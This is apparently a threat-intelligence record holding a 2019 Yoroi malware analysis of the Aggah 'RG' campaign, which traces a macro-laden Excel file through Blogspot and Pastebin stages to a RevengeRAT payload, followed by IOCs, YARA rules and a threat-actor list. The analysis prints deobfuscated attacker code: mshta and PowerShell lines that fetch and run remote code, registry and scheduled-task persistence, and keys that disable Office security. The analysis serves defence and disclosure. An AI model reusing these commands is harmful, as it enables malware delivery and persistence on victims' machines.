{
    "id": "3ff6f150-e095-4a8f-a65c-8b538237e2c7",
    "created_at": "2023-01-12T15:09:04.8998Z",
    "updated_at": "2025-03-27T02:15:06.983516Z",
    "deleted_at": null,
    "sha1_hash": "d49c695cb892eaf1735b48a96145d668016c2f01",
    "title": "2019-06-08 - The Evolution of Aggah- From Roma225 to the RG Campaign",
    "authors": "",
    "file_creation_date": "2022-05-28T15:43:25Z",
    "file_modification_date": "2022-05-28T15:43:25Z",
    "file_size": 807367,
    "plain_text": "# The Evolution of Aggah: From Roma225 to the RG Campaign\n\n**[yoroi.company/research/the-evolution-of-aggah-from-roma225-to-the-rg-campaign/](https://yoroi.company/research/the-evolution-of-aggah-from-roma225-to-the-rg-campaign/)**\n\n08/06/2019\n\n## Introduction\n\n\nAugust 6, 2019\n\n\n[Few months ago we started observing a cyber operation aiming to attack private companies](https://blog.yoroi.company/research/the-enigmatic-roma225-campaign/)\nin various business sectors, from automotive to luxury, education, and media/marketing. The\nattack attribution is still unclear but the large scale of the malicious activities has also been\nconfirmed by Unit42, who reported attack attempt against government verticals too.\n\nThe attacks are characterized by the usage of a Remote Access Trojan named\n“RevengeRat”, suggesting a possible, still unconfirmed and under investigation, connection\nwith the Gorgon Group, a known mercenary APT group who ran cyber-espionage operations\nand who were involved in criminal activities too.\n\n[Few weeks ago, Unit42 discovered another active campaign, compatible with the Roma225](https://unit42.paloaltonetworks.com/aggah-campaign-bit-ly-blogspot-and-pastebin-used-for-c2-in-large-scale-campaign/)\none we tracked on December 2018, pointing to some interesting changes into the attackers\nTTPs. Recently, we intercepted other attacks potentially related with this wider criminal\noperation. For this reason, Cybaze-Yoroi ZLab team decided to analyze this recent campaign\nin order to investigate the evolution of the Aggah threat.\n\n\n-----\n\n## Technical Analysis\n\nThe whole infection chain shows an interesting degree of sophistication, leveraging about\nseventeen stages: a non negligible number of steps putted in place to decouple the infection\nvector from the actual payload. The following info-graphics summarize the infection chain\ndissected in the sections below, starting from the weaponized Office document, initially\ndelivered through malicious emails, to the final RevengeRAT payload.\n\nFigure 1. “RG” campaign infection chain\n\n### The Macro Dropper\n\n**Hash** 7c0a69f93831dcd550999b765c7922392dd0d994b0241071545749e865cc9854\n\n**Threat** Dropper\n\n\n**Brief**\n**Description**\n\n\nXLS Macro dropper\n\n\n**Ssdeep** 768:kCSk3hOdsylKlgxopeiBNhZFGzE+\ncL2kdAJ7evT8RsFbQ:kDk3hOdsylKlgxopeiBNhZFGzE+cL2kt\n\nTable 1: Information about the RevengeRAT malicious macro dropper\n\nAll the infection starts with a malicious XLS document weaponized with an embedded macro.\nThe VB code is polluted by a multitude of junk instructions and after a cleaning phase we\nisolated the essence of the malicious code.\n```\nPublic Function Workbook_Open()\n     rgh1 = YUcIFcEAA(\"tzo{h'o{{wA66ip\", \"7\")\n     rgh2 = YUcIFcEAA(\"{5s€6\", \"7\")\n     rgh3 = YUcIFcEAA(\"7O^7ixXmxmxm\", \"5\")\n     rgh = rgh1 + rgh2 + rgh3\n     Shell rgh\nEnd Function\nPublic Function YUcIFcEAA(Sg1NdPNeR As String, jxvMDn0vV As Integer)\n  Dim PFc88so50 As Integer\n  For PFc88so50 = 1 To Len(Sg1NdPNeR)\n    Mid(Sg1NdPNeR, PFc88so50, 1) = Chr(Asc(Mid(Sg1NdPNeR, PFc88so50, 1)) jxvMDn0vV)\n  Next PFc88so50\n  YUcIFcEAA = Sg1NdPNeR\nEnd Function\n\n```\nCode Snippet 1: real core of the macro\n\n\n-----\n\nFigure 2: Command used to start the\n\ninfection\nA quick and dirty manipulation of the script enabled us to easily bypass the code obfuscation\ntechniques protecting the next stage of the infection: the invocation of a Microsoft HTML\nApplication hosted in a remote location.\n\n[The macro has the only purpose to run the mshta command. As defined by the Mitre,](https://attack.mitre.org/techniques/T1170/)\n“Mshta.exe is a utility that executes Microsoft HTML Applications (HTA). HTA files have the\n_file extension .hta. HTAs are standalone applications that execute using the same models_\n_and technologies of Internet Explorer, but outside of the browser.” ._\n\n### The Hidden HTA\n\nThe malware retrieves the HTA application to run from a remote host behind the Bitly\nshortening service. The target page is the “rg.html”, downloaded from\n“https[://createdbymewithdeniss[ .blogspot[.com/p/rg[.html”. Even in this case, like in the\nRoma255 campaign, the attacker abused the Blogger platform to hide the malicious code in\nplain sight.\n\nFigure 3: Fake Blogspot page\nThe page does not embed any binaries or malicious links, but navigating its source code, it\nreveals packed HTML code dynamically injected into the page during the rendering.\n\nFigure 4: Malicious code contained in the malicious “blogspot” site\nThis additional piece of script is specifically designed to be executed by the “mshta” utility. It\nis a VBScript code creating a “WScript.Shell” object, a particular object decisely not designed\nto be loaded into regular web browsers engines.\n\n\n-----\n\n```\n<script language VBScript >\nSet Xkasdj2 = CreateObject(StrReverse(StrReverse(\"WScript.Shell\")))\nXa_aw1 = StrReverse(StrReverse(\"h\")) +\nStrReverse(StrReverse(StrReverse(StrReverse(\"t\")))) +\nStrReverse(StrReverse(StrReverse(StrReverse(\"t\")))) + StrReverse(StrReverse(\"p\")) +\nStrReverse(\":\") + StrReverse(StrReverse(StrReverse(StrReverse(\"/\")))) +\nStrReverse(StrReverse(StrReverse(StrReverse(\"/\")))) +\nStrReverse(StrReverse(StrReverse(StrReverse(\"w\")))) +\nStrReverse(StrReverse(StrReverse(StrReverse(\"w\")))) +\nStrReverse(StrReverse(StrReverse(StrReverse(\"w\")))) + StrReverse(StrReverse(\".\")) +\nStrReverse(StrReverse(\"p\")) + StrReverse(StrReverse(\"a\")) +\nStrReverse(StrReverse(\"s\")) + StrReverse(StrReverse(StrReverse(StrReverse(\"t\")))) +\nStrReverse(\"e\") + StrReverse(\"b\") + StrReverse(\"i\") + StrReverse(\"n\") +\nStrReverse(StrReverse(\".\")) + StrReverse(\"c\") + StrReverse(\"o\") +\nStrReverse(StrReverse(\"m\")) + StrReverse(StrReverse(StrReverse(StrReverse(\"/\")))) +\nStrReverse(\"r\") + StrReverse(StrReverse(\"a\")) +\nStrReverse(StrReverse(StrReverse(StrReverse(\"w\")))) +\nStrReverse(StrReverse(StrReverse(StrReverse(\"/\"))))\nXa_aw0 = StrReverse(StrReverse(\"m\")) + StrReverse(StrReverse(\"s\")) +\nStrReverse(StrReverse(\"h\")) + StrReverse(StrReverse(StrReverse(StrReverse(\"t\")))) +\nStrReverse(\" a\")\nXa_aw2 = \"efZDG7aL\"\nXXX = Xa_aw0 + Xa_aw1 + Xa_aw2\nMorg = XXX\nXa_aw = Morg\nXkasdj2.Run Xa_aw, vbHide\nself.close\n</script>\n\n```\nCode Snippet 2: Javascript code after “unescape” function\n\nThe VBScript code is obfuscated using a series of “StrReverse” functions. But the action it\nperforms is still clearly evident: call another mshta process and execute a new HTA\napplication hosted on Pastebin (hxxp[://pastebin[.com/raw/efZDG7aL).\n\nFigure 5: Malicious code stored on pastebin\nThis other script is also encoded in hexadecimal format. After its decoding its content can be\ndivided into four parts. The first one is responsible for killing some of the Microsoft Office\nsuite processes, like Word, Excel, Publisher and PowerPoint.\n```\n“cmd.exe /c taskkill /f /im winword.exe & taskkill /f /im excel.exe & taskkill /f /im\nMSPUB.exe & taskkill /f /im POWERPNT.EXE”\n\n```\nCode Snippet 3: First deobfuscated piece of code\n\nInstead, the second chunk hides the next malware stage invocation within a Powershell\nscript.\n```\npowershell.exe [email protected]\n(91,118,111,105,100,93,32,91,83,121,115,116,101,109,46,82,101,102,108,101,99,116,105,1\n[System.Text.Encoding]::ASCII.GetString($LOLO)|IEX\n\n```\n\n-----\n\nCode Snippet 4: Second deobfuscated piece of code\n\nThis code snippet hides a Powershell executable stage encoded in numeric format. The\ncorrespondent ASCII text is then executed through the IEX command-let.\n```\n[void]\n[System.Reflection.Assembly]::LoadWithPartialName('Microsoft.VisualBasic');$fj=\n[Microsoft.VisualBasic.Interaction]::CallByname((New-Object\nNet.WebClient),'DownloadString',\n[Microsoft.VisualBasic.CallType]::Method,'https://pastebin[.com/raw/CM22vTup')|IEX;\n[Byte[]]$f=[Microsoft.VisualBasic.Interaction]::CallByname((New-Object\nNet.WebClient),'DownloadString',\n[Microsoft.VisualBasic.CallType]::Method,'https://pastebin[.com/raw/Qx0K2baN').replace\n[k.Hackitup]::exe('MSBuild.exe',$f)\n\n```\nCode Snippet 5: Deobfuscated powershell function\n\nThis code builds up the core of the malware implant (discussed in the next section). The third\nchunk of the code, instead, is where the attacker sets two different persistence mechanisms.\nBoth of them invokes two different HTA application retrieved from Pastebin:\n\nThe first persistency method is the classic “Run” registry key.\n```\nSet Xm_w = CreateObject(\"WScript.Shell\")\nL_Xe = \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\AvastUpdate\"\nXm_w.RegWrite L_Xe,\"mshta.exe http://pastebin[.com/raw/bMJxXtXa\",\"REG_EXPAND_SZ\"\n\n```\nCode Snippet 6: Third deobfuscated piece of code (part 1)\n\nThe second persistency method abuses scheduled tasks.\n```\nSet Mi_G = CreateObject(StrReverse(StrReverse(\"WScript.Shell\")))\nDim We_wW\nWe_wW0 = StrReverse(\"t/ 03 om/ ETUNIM cs/ etaerc/ sksathcs\")\nWe_wW1 = \"n \"\"Windows Update\"\" /tr \"\"mshta.ex\"\nWe_wW2 = \"e h\" + \"t\" + \"t\" + \"p\" + \":\" + \"/\" + \"/\" + \"p\" + \"a\" + \"s\" + \"t\" + \"e\" +\n\"b\" + \"i\" + \"n\" + \".\" + \"c\" + \"o\" + \"m\" + \"/\" + \"r\" + \"a\" + \"w\" + \"/tuGAsMze\"\" /F \"\nWe_wW = We_wW0 + We_wW1 + We_wW2\nMi_G.Run We_wW, vbHide\n\n```\nCode Snippet 7: Third deobfuscated piece of code (part 2)\n\nBoth of the scripts are stored onto Pastebin platform and even if the first one has been\nremoved, the malware maintains its persistence thanks to the execution of the second\nmethod.\n\nThe last chunk of code, the fourth, contains a huge number of Registry keys ready to be set\non the target machine. This behavior has been implemented to drastically reduce the\ndefenses of the target host, for instance disabling security features oft the Microsoft Windows\nand the Office ecosystem. The “Edited Registry Keys” section reports them.\n\n\n-----\n\n### The Hagga Pastes\n\nAs stated in the previous section, the Code Snippet 5 contains the core of malicious\nactions. The malware concurrently downloads and executes powershell code from two\npastes. The first one is \"CM22vTup\" and have been published by a Pastebin user named\n“HAGGA”, the same reported in the PaloAlto analysis.\n\nFigure 6: New payload downloaded from Pastebin\nAs previously hinted the Powershell code in the “CM22vTup” snippet encodes its payload in\nnumeric format. Decoding “PAYLOAD-1“, another obfuscated Powershell script reveals the\nloading of a shellcode directly in the running process memory.\n```\n[email protected](PAYLOAD-1);$p=[System.Text.Encoding]::ASCII.GetString($jk)|IEX\n\n```\nCode Snippet 8: Code structure of the downloaded script\n```\n[Byte[]]$sc64=iex('PAYLOAD_2'.replace('%_','0x'));$a =\n[Microsoft.VisualBasic.Interaction]::CallByname([AppDomain]::CurrentDomain,'Load',\n[Microsoft.VisualBasic.CallType]::Method,$sc64)\n\n```\nCode Snippet 9: Structure of the script contained in “PAYLOAD_1”\n\nAfter a basic manipulation, The data hidden in “PAYLOAD_2” results to be the hexadecimal\nrepresentation of a PE file, easily recognizable due to the characteristic ”4D 5A” header.\n```\n%_4D,%_5A,%_90,%_00,%_03,%_00,%_00,%_00,%_04,%_00,%_00,%_00,%_FF,%_FF,%_00,%_00,%_B8,%\n [.....]\n\n```\nCode Snippet 10: “PAYLOAD_2” in hex encoding\n\nThis PE 32 file is a well formed .Net assembly. In the following table are shown the static\ninformation about it.\n\n**Hash** 84833991f1705a01a11149c9d037c8379a9c2d463dc30a2fec27bfa52d218fa6\n\n**Threat** RevengeRAT / Injector\n\n\n**Brief**\n**Description**\n\n\nRevengeRAT / injector payload Obfuscated\n\n\n**Ssdeep** 768:zQosoqOovPJmzW0GzJrMfogNeEbSBUrOaqVJswUna4OI\n9O:zQyoUzW0GrQ6UiaqVJ1Ua4Vs\n\nTable 2: Information about the RevengeRAT / Injector malicious payload\n\n\n-----\n\nFigure 7: Static information about\n\npayload described in table 2\nHowever, the .Net payload is not totally unprotected. In fact it has been obfuscated with the\n“ConfuserEx” obfuscator.\n\nThe assembly is a Dynamic Linked Library with only one purpose: inject the payload into a\n[target process through the well known “Process Hollowing” technique. At this stage of the](https://attack.mitre.org/techniques/T1093/)\ninfection chain the final payload could be retrieved, the RevengeRAT remote administration\ntool.\n\nFigure 8: Process Hollowing references inside the PE file\n\n### The RevengeRAT Payload\n\n\n-----\n\nFigure 9: RevengeRAT payload in hex\n\nencoding\nThe final payload is the one downloaded from the Pastebin page “Qx0K2baN”, as reported in\nCode Snippet 5. This code comes with the same obfuscation method seen in PAYLOAD_2,\nhex encoding together with a simple replacing routine.\n\n**Hash** 35e9bcc5654b1ebec035a481bc5ad67dc2341c1b534ac904c5bf28e3a5703eff\n\n**Threat** RevengeRAT\n\n\n**Brief**\n**Description**\n\n\nRevengeRAT injector payload Obfuscated\n\n\n**Ssdeep** 768:3Yo9AzKlOOYIl+tqRsoYGvoJGPdyOYOCbf9eThI21Os+\nJZiIPxTS0X4Dwrw2T9:5AmlEIl+tqSoY2oyfYOweT6s+JlPVnz\n\nTable 4: Information about the RevengeRAT malicious payload\n\nEven this executable is a well formed .Net Assembly, but in this case it is obfuscated with\nanother tool, “.Net Reactor”, a commercial code protection tool specialized in .Net\napplications.\n\nFigure 10: Evidence about .NET Reactor obfuscator\nExploring the code, we found many similarities with the same RevengeRAT threat previously\n[analyzed by us and by](https://blog.yoroi.company/research/the-enigmatic-roma225-campaign/) [Unit 42. This means, with reasonable confidence, the campaign we](https://unit42.paloaltonetworks.com/aggah-campaign-bit-ly-blogspot-and-pastebin-used-for-c2-in-large-scale-campaign/)\nare dissecting could be an evolution of the previous campaigns, showing an increase of the\nmalware stealthiness and the adoption of new techniques like process hollowing in the\ninfection chain. Despite that, the RevengeRAT core is substantially the same.\n\n\n-----\n\nFigure 11: Comparison among RevengeRAT belonging to different campaigns\nThis time the recurring word is “rg”. In fact the two payloads download from the pastebin\nplatform are “rgrunpe” and “rgbin”; also the new command and control server domains starts\nwith the two letters “rg”, the codename of this last campaign. This time, despite the\n“roma225” case, the socket key of the rat is configured differently with the static string\n“lunlayo” and the id is “HOTEIS NOVOS” instead of “POWERScreenPOWER”.\n\nAnyway, as shown in Figure 11, the ID and Mutex of the last two campaigns are the same,\nindicating the fact that the group is active and the infection campaign continues. Moreover,\nconsidering the number of views counted by the Pastebin snippet “CM22vTup”, the one\ndelivering the RevengeRAT payload, is possible to estimate the magnitude of the attack,\nwhich may involve up to 1600 victims.\n\nFigure 12: Hagga campaign reference\n\n## Conclusion\n\nSince December 2018, we are following the tracks of this ambiguous cyber criminal group,\ninternally referenced as TH-173. There are chances this whole activity could be linked with\nthe Gorgon Group, but at the moment we have no definitive evidence of this connection.\n\nAnyway, through the constant eyes on this threat, we observed a refinement in their infection\nchain while they are maintaining intact some of their TTP, such as the abuse of the Blogspot\nplatform and legit dynamic DNS services. In fact, the group started abusing Pastebin to add\ncomplexity into the infection chain, mixing up hidden MSHTA code, Powershell scripts and\nalso additional process injection techniques to their arsenal.\n\n## Indicator of Compromise\n\nDropurl:\n\ns://createdbymewithdeniss[.blogspot[.com/p/rg[.html\ns://pastebin[.com/raw/CM22vTup\ns://pastebin[.com/raw/Qx0K2baN\n/pastebin[.com/raw/bMJxXtXa\n/pastebin[.com/raw/efZDG7aL\nComponents:\n\n84833991f1705a01a11149c9d037c8379a9c2d463dc30a2fec27bfa52d218fa6\n35e9bcc5654b1ebec035a481bc5ad67dc2341c1b534ac904c5bf28e3a5703eff\nC2:\n\nrgalldmn[.duckdns[.com:666\n\n\n-----\n\nPersistence:\n\nSet registry key:\n“HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\AvastUpdate\" with value\n“mshta.exe http[://pastebin[.com/raw/bMJxXtXa”\nschtasks /create /sc MINUTE /mo 30 /t n \"\"Windows Update\"\" /tr \"\"mshta.exe\nhttp[://pastebin[.com/raw/tuGAsMze\nHash:\n\n7c0a69f93831dcd550999b765c7922392dd0d994b0241071545749e865cc9854\n84833991f1705a01a11149c9d037c8379a9c2d463dc30a2fec27bfa52d218fa6\n35e9bcc5654b1ebec035a481bc5ad67dc2341c1b534ac904c5bf28e3a5703eff\na318ce12ddd1b512c1f9ab1280dc25a254d2a1913e021ae34439de9163354243\nc9b3a21aec8f7f484120c16d7ee70853020dc9fd2e881d504903c371d1028937\ne8cd233191e85b4e8827cfe5f3bf29a8f649104867dba769f318afac80cf3940\n3fe7fc16905794e0a537c5491ef24bcb5eb54b75410dea8e15647863c5ed9e88\n460342387c1d23300960e485bafd7cca69eea17ddc973189f3bd192d30bd8ba6\n30768b0e8192c5fad94ed8f0c7c8b1bf4507fa2f586e77e1833808237a4bb9b2\ne7bb5d9614a35da8c85e2866dc36a05e30660667303897515cc59c456deacdbb\n7eac7da2dfddad9d118c93e73afb3d8ceb2d401765ec48b88eea15adda871de6\n4522b9f776deac10d3df322d5a87731bdfd51a73862b93e48d14fc954b28c6d1\n\n### Yara Rules\n\n\n-----\n\n```\nrule rg_RevengeRAT_excel_macro_dropper_July_2019{\n  meta:\n   description = \"Yara Rule for revengeRAT_rg\"\n   author = \"Cybaze Zlab_Yoroi\"\n   last_updated = \"2019-08-01\"\n   tlp = \"white\"\n   category = \"informational\"\n  strings:\n          $a1 = {D0 CF 11 E0 A1 B1}\n          $a2 = {EC A8 F9 46 C9 16}\n          $a3 = {91 26 DD 88 D0 AD}\n          $a4 = \"GyjQSnPUjfNcA\"\n          $a5 = \"CMG=\\\"2D2F8\"\n  condition:\n     all of them\n}\nimport \"pe\"\nrule rg_RevengeRAT_payload_1_July_2019 {\n  meta:\n   description = \"Yara Rule for revengeRAT_rg payload_1\"\n   author = \"Cybaze Zlab_Yoroi\"\n   last_updated = \"2019-08-01\"\n   tlp = \"white\"\n   category = \"informational\"\n  strings:\n          $a1 = {4D 5A}\n          $a2 = \"kFeS0JCm\" wide ascii\n          $a3 = {A1 6B 31 63 EE 9F}\n          $a4 = {06 38 70 DE FF FF 28}\n  condition:\n     2 of ($a*) and pe.number_of_sections == 3\n}\nimport \"pe\"\nrule rg_RevengeRAT_payload_2_July_2019{\n  meta:\n   description = \"Yara Rule for revengeRAT_rg\"\n   author = \"Cybaze Zlab_Yoroi\"\n   last_updated = \"2019-08-01\"\n   tlp = \"white\"\n   category = \"informational\"\n  strings:\n          $a1 = {4D 5A}\n          $a2 = {93 E5 21 3F 59 AE}\n          $a3 = {11 08 28 22}\n          $a4 = \"v2.0.507\"\n\n```\n\n-----\n\n```\n          $a5 {E2 80 8C E2 80}\n          $a6 = {81 AC E2 81 AF E2 80 AE}\n          $a7 = {E2 81 AA E2 80}\n          $a8 = {81 AF E2 80 AA}\n          $a9 = {81 AC E2 81 AF E2 80 AE}\n          $a10 = {C5 C7 4C 9E 65 A5 B6 42}\n  condition:\n     6 of ($a*)\n}\n\n### Edited Registry keys\n\n```\n\n-----\n\n```\nHKCU\\Software\\Microsoft\\Office\\16.0\\Excel\\Security\\ProtectedView\\DisableUnsafeLocation\nHKCU\\Software\\Microsoft\\Office\\16.0\\Excel\\Security\\ProtectedView\\DisableAttachementsIn\nHKCU\\Software\\Microsoft\\Office\\16.0\\Excel\\Security\\ProtectedView\\DisableInternetFilesI\nHKCU\\Software\\Microsoft\\Office\\16.0\\PowerPoint\\Security\\ProtectedView\\DisableUnsafeLoc\nHKCU\\Software\\Microsoft\\Office\\16.0\\PowerPoint\\Security\\ProtectedView\\DisableAttacheme\nHKCU\\Software\\Microsoft\\Office\\16.0\\PowerPoint\\Security\\ProtectedView\\DisableInternetF\nHKCU\\Software\\Microsoft\\Office\\16.0\\Word\\Security\\ProtectedView\\DisableUnsafeLocations\nHKCU\\Software\\Microsoft\\Office\\16.0\\Word\\Security\\ProtectedView\\DisableAttachementsInP\nHKCU\\Software\\Microsoft\\Office\\16.0\\Word\\Security\\ProtectedView\\DisableInternetFilesIn\nHKCU\\Software\\Microsoft\\Office\\15.0\\Excel\\Security\\ProtectedView\\DisableUnsafeLocation\nHKCU\\Software\\Microsoft\\Office\\15.0\\Excel\\Security\\ProtectedView\\DisableAttachementsIn\nHKCU\\Software\\Microsoft\\Office\\15.0\\Excel\\Security\\ProtectedView\\DisableInternetFilesI\nHKCU\\Software\\Microsoft\\Office\\15.0\\PowerPoint\\Security\\ProtectedView\\DisableUnsafeLoc\nHKCU\\Software\\Microsoft\\Office\\15.0\\PowerPoint\\Security\\ProtectedView\\DisableAttacheme\nHKCU\\Software\\Microsoft\\Office\\15.0\\PowerPoint\\Security\\ProtectedView\\DisableInternetF\nHKCU\\Software\\Microsoft\\Office\\15.0\\Word\\Security\\ProtectedView\\DisableUnsafeLocations\nHKCU\\Software\\Microsoft\\Office\\15.0\\Word\\Security\\ProtectedView\\DisableAttachementsInP\nHKCU\\Software\\Microsoft\\Office\\15.0\\Word\\Security\\ProtectedView\\DisableInternetFilesIn\nHKCU\\Software\\Microsoft\\Office\\14.0\\Excel\\Security\\ProtectedView\\DisableUnsafeLocation\nHKCU\\Software\\Microsoft\\Office\\14.0\\Excel\\Security\\ProtectedView\\DisableAttachementsIn\nHKCU\\Software\\Microsoft\\Office\\14.0\\Excel\\Security\\ProtectedView\\DisableInternetFilesI\nHKCU\\Software\\Microsoft\\Office\\14.0\\PowerPoint\\Security\\ProtectedView\\DisableUnsafeLoc\nHKCU\\Software\\Microsoft\\Office\\14.0\\PowerPoint\\Security\\ProtectedView\\DisableAttacheme\nHKCU\\Software\\Microsoft\\Office\\14.0\\PowerPoint\\Security\\ProtectedView\\DisableInternetF\nHKCU\\Software\\Microsoft\\Office\\14.0\\Word\\Security\\ProtectedView\\DisableUnsafeLocations\nHKCU\\Software\\Microsoft\\Office\\14.0\\Word\\Security\\ProtectedView\\DisableAttachementsInP\nHKCU\\Software\\Microsoft\\Office\\14.0\\Word\\Security\\ProtectedView\\DisableInternetFilesIn\nHKCU\\Software\\Microsoft\\Office\\12.0\\Excel\\Security\\ProtectedView\\DisableUnsafeLocation\n\n```\n\n-----\n\n```\nHKCU\\Software\\Microsoft\\Office\\12.0\\Excel\\Security\\ProtectedView\\DisableAttachementsIn\nHKCU\\Software\\Microsoft\\Office\\12.0\\Excel\\Security\\ProtectedView\\DisableInternetFilesI\nHKCU\\Software\\Microsoft\\Office\\12.0\\PowerPoint\\Security\\ProtectedView\\DisableUnsafeLoc\nHKCU\\Software\\Microsoft\\Office\\12.0\\PowerPoint\\Security\\ProtectedView\\DisableAttacheme\nHKCU\\Software\\Microsoft\\Office\\12.0\\PowerPoint\\Security\\ProtectedView\\DisableInternetF\nHKCU\\Software\\Microsoft\\Office\\12.0\\Word\\Security\\ProtectedView\\DisableUnsafeLocations\nHKCU\\Software\\Microsoft\\Office\\12.0\\Word\\Security\\ProtectedView\\DisableAttachementsInP\nHKCU\\Software\\Microsoft\\Office\\12.0\\Word\\Security\\ProtectedView\\DisableInternetFilesIn\nHKCU\\Software\\Microsoft\\Office\\11.0\\Excel\\Security\\ProtectedView\\DisableUnsafeLocation\nHKCU\\Software\\Microsoft\\Office\\11.0\\Excel\\Security\\ProtectedView\\DisableAttachementsIn\nHKCU\\Software\\Microsoft\\Office\\11.0\\Excel\\Security\\ProtectedView\\DisableInternetFilesI\nHKCU\\Software\\Microsoft\\Office\\11.0\\PowerPoint\\Security\\ProtectedView\\DisableUnsafeLoc\nHKCU\\Software\\Microsoft\\Office\\11.0\\PowerPoint\\Security\\ProtectedView\\DisableAttacheme\nHKCU\\Software\\Microsoft\\Office\\11.0\\PowerPoint\\Security\\ProtectedView\\DisableInternetF\nHKCU\\Software\\Microsoft\\Office\\11.0\\Word\\Security\\ProtectedView\\DisableUnsafeLocations\nHKCU\\Software\\Microsoft\\Office\\11.0\\Word\\Security\\ProtectedView\\DisableAttachementsInP\nHKCU\\Software\\Microsoft\\Office\\11.0\\Word\\Security\\ProtectedView\\DisableInternetFilesIn\nHKCU\\Software\\Microsoft\\Office\\16.0\\Excel\\Security\\VBAWarnings\nHKCU\\Software\\Microsoft\\Office\\15.0\\Excel\\Security\\VBAWarnings\nHKCU\\Software\\Microsoft\\Office\\14.0\\Excel\\Security\\VBAWarnings\nHKCU\\Software\\Microsoft\\Office\\12.0\\Excel\\Security\\VBAWarnings\nHKCU\\Software\\Microsoft\\Office\\11.0\\Excel\\Security\\VBAWarnings\nHKCU\\Software\\Microsoft\\Office\\16.0\\PowerPoint\\Security\\VBAWarnings\nHKCU\\Software\\Microsoft\\Office\\15.0\\PowerPoint\\Security\\VBAWarnings\nHKCU\\Software\\Microsoft\\Office\\14.0\\PowerPoint\\Security\\VBAWarnings\nHKCU\\Software\\Microsoft\\Office\\12.0\\PowerPoint\\Security\\VBAWarnings\nHKCU\\Software\\Microsoft\\Office\\11.0\\PowerPoint\\Security\\VBAWarnings\nHKCU\\Software\\Microsoft\\Office\\16.0\\Word\\Security\\VBAWarnings\nHKCU\\Software\\Microsoft\\Office\\15.0\\Word\\Security\\VBAWarnings\nHKCU\\Software\\Microsoft\\Office\\14.0\\Word\\Security\\VBAWarnings\nHKCU\\Software\\Microsoft\\Office\\12.0\\Word\\Security\\VBAWarnings\nHKCU\\Software\\Microsoft\\Office\\11.0\\Word\\Security\\VBAWarnings\n\n```\n_This blog post was authored by Luigi Martire, Davide Testa and Luca Mella of Cybaze-Yoroi_\n_Z-LAB_\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2019/2019-06-08 - The Evolution of Aggah- From Roma225 to the RG Campaign.pdf"
    ],
    "report_names": [
        "2019-06-08 - The Evolution of Aggah- From Roma225 to the RG Campaign.pdf"
    ],
    "threat_actors": [
        {
            "id": "28851008-77b4-47eb-abcd-1bb5b3f19fc2",
            "created_at": "2023-06-20T02:02:10.254614Z",
            "updated_at": "2025-03-27T02:00:03.130853Z",
            "deleted_at": null,
            "main_name": "Hagga",
            "aliases": [
                "TH-157",
                "Aggah"
            ],
            "source_name": "MISPGALAXY:Hagga",
            "tools": [
                "Agent Tesla"
            ],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "0a03e7f0-2f75-4153-9c4f-c46d12d3962e",
            "created_at": "2022-10-25T15:50:23.453824Z",
            "updated_at": "2025-03-27T02:00:55.473216Z",
            "deleted_at": null,
            "main_name": "Ke3chang",
            "aliases": [
                "Ke3chang",
                "APT15",
                "Vixen Panda",
                "GREF",
                "Playful Dragon",
                "RoyalAPT",
                "Nylon Typhoon"
            ],
            "source_name": "MITRE:Ke3chang",
            "tools": [
                "Okrum",
                "Systeminfo",
                "netstat",
                "spwebmember",
                "Mimikatz",
                "Tasklist",
                "MirageFox",
                "Neoichor",
                "ipconfig"
            ],
            "source_id": "MITRE",
            "reports": null
        },
        {
            "id": "6c4e4b91-1f98-49e2-90e6-435cea8d3d53",
            "created_at": "2022-10-25T16:07:23.693797Z",
            "updated_at": "2025-03-27T02:02:09.924056Z",
            "deleted_at": null,
            "main_name": "Gorgon Group",
            "aliases": [
                "ATK 92",
                "Pasty Draco",
                "Subaat",
                "TAG-CR5"
            ],
            "source_name": "ETDA:Gorgon Group",
            "tools": [
                "AgenTesla",
                "Agent Tesla",
                "AgentTesla",
                "Atros2.CKPN",
                "Bladabindi",
                "CinaRAT",
                "Crimson RAT",
                "ForeIT",
                "Jorik",
                "LOLBAS",
                "LOLBins",
                "Living off the Land",
                "Loki",
                "Loki.Rat",
                "LokiBot",
                "LokiPWS",
                "MSIL",
                "MSIL/Crimson",
                "Nancrat",
                "NanoCore",
                "NanoCore RAT",
                "Negasteal",
                "NetWeird",
                "NetWire",
                "NetWire RAT",
                "NetWire RC",
                "NetWired RC",
                "Origin Logger",
                "Quasar RAT",
                "QuasarRAT",
                "Recam",
                "Remcos",
                "RemcosRAT",
                "Remvio",
                "Revenge RAT",
                "RevengeRAT",
                "Revetrat",
                "SEEDOOR",
                "Scarimson",
                "Socmer",
                "Yggdrasil",
                "ZPAQ",
                "Zurten",
                "njRAT"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "7c8cf02c-623a-4793-918b-f908675a1aef",
            "created_at": "2023-01-06T13:46:38.309165Z",
            "updated_at": "2025-03-27T02:00:02.801298Z",
            "deleted_at": null,
            "main_name": "APT15",
            "aliases": [
                "BRONZE PALACE",
                "Nylon Typhoon",
                "VIXEN PANDA",
                "Playful Dragon",
                "BRONZE DAVENPORT",
                "BRONZE IDLEWOOD",
                "G0004",
                "Red Vulture",
                "Ke3Chang",
                "Metushy",
                "Lurid",
                "Social Network Team",
                "Royal APT"
            ],
            "source_name": "MISPGALAXY:APT15",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "b0d34dd6-ee90-483b-bb6c-441332274160",
            "created_at": "2022-10-25T16:07:23.296754Z",
            "updated_at": "2025-03-27T02:02:09.724313Z",
            "deleted_at": null,
            "main_name": "Aggah",
            "aliases": [
                "Operation Red Deer",
                "Operation Roma225"
            ],
            "source_name": "ETDA:Aggah",
            "tools": [
                "AgenTesla",
                "Agent Tesla",
                "AgentTesla",
                "Aggah",
                "Atros2.CKPN",
                "Bladabindi",
                "Jorik",
                "Nancrat",
                "NanoCore",
                "NanoCore RAT",
                "Negasteal",
                "Origin Logger",
                "Revenge RAT",
                "RevengeRAT",
                "Revetrat",
                "Warzone",
                "Warzone RAT",
